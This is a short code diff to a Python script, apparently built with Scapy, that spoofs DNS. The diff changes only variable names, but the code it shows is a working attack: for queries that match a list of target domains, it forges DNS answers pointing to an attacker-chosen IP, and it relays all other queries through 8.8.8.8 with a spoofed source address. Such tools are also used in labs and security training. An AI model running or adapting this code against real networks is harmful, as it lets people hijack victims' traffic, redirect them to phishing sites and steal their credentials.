@@ -8,9 +8,9 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
     def forward_dns(pkt: IP):
         print(f"Forwarding: {pkt[DNSQR].qname}")
         response = sr1(IP(dst='8.8.8.8')/UDP(sport=pkt[UDP].sport)/DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),verbose=0,)
-        resp_pkt = IP(dst=pkt[IP].src, src=dns_server_ip)/UDP(dport=pkt[UDP].sport)/DNS()
-        resp_pkt[DNS] = response[DNS]
-        send(resp_pkt, verbose=0)
+        response_pkt = IP(dst=pkt[IP].src, src=dns_server_ip)/UDP(dport=pkt[UDP].sport)/DNS()
+        response_pkt[DNS] = response[DNS]
+        send(response_pkt, verbose=0)
         return f"Responding to {pkt[IP].src}"
 
     #local function to get the pkt and determine if to send a spoofed reply or foward to actual google dns server
@@ -19,8 +19,8 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
             
             for domain in spoof_domains:
                 if domain in str(pkt["DNS Question Record"].qname) or domain in pkt["DNS Question Record"].qname.decode('utf-8') :
-                    spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname=domain + ".",rdata=dns_ip))
-                    send(spf_resp, interface=interface)
+                    spoofed_pkt = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,ancount=1,rd=1, qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname, rdata=dns_ip)/DNSRR(rrname=domain + ".",rdata=dns_ip))
+                    send(spoofed_pkt, interface=interface)
                     return f"Spoofed DNS Response Sent: {pkt[IP].src} {pkt[DNSQR].qname}"
                 
             else:
@@ -28,6 +28,7 @@ def dns_responder(dns_ip: str, dns_server_ip, interface):
                 return forward_dns(pkt)
 
     return get_response
+
 
 def main():
     #Retrieve settings from user
